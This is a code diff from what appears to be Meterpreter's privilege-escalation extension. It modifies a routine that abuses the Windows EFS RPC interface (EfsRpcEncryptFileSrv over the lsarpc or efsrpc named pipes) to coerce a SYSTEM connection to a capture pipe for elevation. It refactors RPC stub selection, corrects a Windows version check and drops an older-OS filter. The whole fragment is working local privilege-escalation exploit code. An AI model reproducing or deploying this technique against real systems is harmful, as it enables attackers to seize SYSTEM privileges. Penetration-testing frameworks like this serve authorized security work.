@@ -5,9 +5,9 @@
 
 typedef NTSTATUS(WINAPI* PRtlGetVersion)(LPOSVERSIONINFOEXW);
 
-void switch_to_lsarpc_endpoint();
-
-RPC_STATUS EfsRpcEncryptFileSrv(handle_t binding_h, wchar_t* FileName);
+RPC_STATUS StubEfsRpcEncryptFileSrv(PMIDL_STUB_DESC stub, handle_t binding_h, wchar_t* FileName);
+PMIDL_STUB_DESC GetLsaRpcStub();
+PMIDL_STUB_DESC GetEfsRpcStub();
 
 DWORD WINAPI trigger_efs_connection(RPC_WSTR uuid, RPC_WSTR endpoint, LPWSTR pPipeName);
 handle_t efs_bind(RPC_WSTR uuid, RPC_WSTR endpoint, wchar_t* target);
@@ -49,18 +49,11 @@ DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
 			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: RtlGetVersion failed");
 		}
 
-		// filter out systems older than Windows Vista / Server 2008 (6.0) for this technique
-		if (os.dwMajorVersion < 6) {
-			SetLastError(ERROR_CALL_NOT_IMPLEMENTED);
-			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: Windows versions older than 6.0 are unsupported");
-		}
-
 		// Windows Vista / Server 2008 and prior only supports \pipe\lsarpc endpoint
-		if ((os.dwMajorVersion < 6) || (os.dwMajorVersion == 6 && (os.dwMajorVersion == 0 || os.dwMajorVersion == 1))) {
+		if ((os.dwMajorVersion < 6) || (os.dwMajorVersion == 6 && (os.dwMinorVersion == 0 || os.dwMinorVersion == 1))) {
 			if (!does_pipe_exist(L"\\\\.\\pipe\\lsarpc")) {
 				BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: \\pipe\\lsarpc is not listening.");
 			}
-			switch_to_lsarpc_endpoint();
 			wEndpointUUID = &LSARPC_PIPE_MS_EFSR_UUID;
 			wNamedPipeEndpoint = &LSARPC_NAMEDPIPE;
 		}
@@ -184,7 +177,8 @@ DWORD WINAPI trigger_efs_connection(RPC_WSTR uuid, RPC_WSTR endpoint, LPWSTR pPi
 			if (ht == INVALID_HANDLE_VALUE) {
 				BREAK_WITH_ERROR("[ELEVATE] trigger_efs_connection: Bind error", ERROR_INVALID_HANDLE);
 			}
-			hr = EfsRpcEncryptFileSrv(ht, pCaptureServer);
+			PMIDL_STUB_DESC stub = wcscmp(endpoint, LSARPC_NAMEDPIPE) == 0 ? GetLsaRpcStub() : GetEfsRpcStub();
+			hr = StubEfsRpcEncryptFileSrv(stub, ht, pCaptureServer);
 		RpcExcept(EXCEPTION_EXECUTE_HANDLER)
 			dprintf("[ELEVATE] trigger_efs_connection: RPC Error: 0x%08x", RpcExceptionCode());
 			dwResult = RPC_S_CALL_FAILED;
